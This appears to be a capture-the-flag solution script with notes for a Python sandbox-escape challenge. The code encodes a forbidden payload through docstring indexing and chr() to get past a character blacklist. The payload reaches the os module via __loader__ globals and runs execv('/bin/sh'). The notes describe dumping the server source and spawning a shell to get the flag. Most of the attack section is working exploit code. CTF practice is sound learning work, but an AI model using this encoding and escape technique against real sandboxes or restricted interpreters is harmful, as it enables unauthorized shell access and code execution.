import string
#from pwn import *

def filter(s):
    bad = r'4568bfhjkmquwxyz!#$%&\*,-/:;<=>?@\\^`{|}~ '
    bad_in_s = set(c for c in s if c in bad or c.isupper())
    return bad_in_s

def is_good(s):
    return filter(s) == set()

good = ''.join(sorted(set(string.printable) - filter(string.printable)))

doc = {
    '__loader__.__doc__': 'Concrete implementation of SourceLoader using the file system.',
    '"".__doc__': "".__doc__,
}

def makenum(n):
    s = str(n)
    if is_good(s):
        return s
    s = oct(n)
    if is_good(s):
        return s
    return None

def num1(n):
    for attempt in range(n, 0, -1):
        got = makenum(attempt)
        if got:
            return (attempt, got)
    raise ValueError('really fucked up here')

def num(n):
    #print('making ', n)
    if n == 0:
        return '0'
    parts = []
    remaining = n
    while remaining > 0:
        (remove, part) = num1(remaining)
        parts.append(part)
        remaining -= remove
    return '+'.join(parts)

def docify(c):
    if c in good:
        return repr(c)
    for (k, v) in doc.items():
        idx = v.find(c)
        if idx != -1:
            return f'{k}[{num(idx)}]'
    return f'a({num(ord(c))})'

def d(s):
    return '+'.join(docify(c) for c in s)

a = chr

evil = '__loader__.get_data.__globals__["_os"].execv("/bin/sh", ("/bin/sh",))'
d(evil)

"""
\t\n\x0b\x0c\r"\'()+.012379[]_acdegilnoprstv

Good builtins:
- __loader__
- all
- eval
- print (??) what the fuck version is this? must be 3 (!)
- repr
- str

Observations:
- open is "Denied", /not/ undefined
- __loader__ is a SourceFileLoader, implying our shit is going into a file and being exec'd

Path of exploitation:
- First enumerated what was accepted in terms of input
- Wrote tooling to reimplement the filtering algorithm
- Used this tooling to find what I could poke at
- Started fucking with `__loader__`, realized I could abuse docstrings of things to get the forbidden characters, then implemented doing that automatically in my tool
- Fucked around some more with it to get at the internal attributes of the ALLES function, found the filename of the server, and knowing that I had a primitive to dump files in __loader__.get_data, I dumped the source code of the server
- Now I could eval arbitrary code, and had to figure out how to escape
- Didn't realize that builtins are the same for every single Python file so we couldn't steal them from other ones, which took a very long time
- Took way too long to decide to run the challenge locally and turn off all the security so I could see what was going on better and use more variables
- Tried to use a reverse shell
- Eventually got some sense with https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes, found I could get a reference to the _os module from the inside of __loader__, and called execv("/bin/sh", ("/bin/sh",)), poked around, and dumped the flag

- Since I escaped I just fucked around with it locally, and this happened:
In [29]: ALLES('ALLES{th1s_w4s_a_r34l_3sc4pe}')
Out[29]: '133713t,ct\x1c%a\x1f\x15f\x1b\x1eaQn\x11'
##         ⬆ 🤔🤔🤔🤔🤔🤔🤔🤔🤔🤔🤔🤔🤔🤔
In [30]: ALLES('1337133713371337133713371337')
Out[30]: 'ALLES{3sc4ped_y0u_aR3}'


['__class__',
 '__delattr__',
 '__dict__',
 '__dir__',
 '__doc__',
 '__ge__',
 '__gt__',
 '__init__',
 '__le__',
 '__lt__',
 '__ne__',
 '__repr__',
 '__setattr__',
 '__str__',
 'contents',
 'get_code',
 'get_data',
 'set_data']
"""


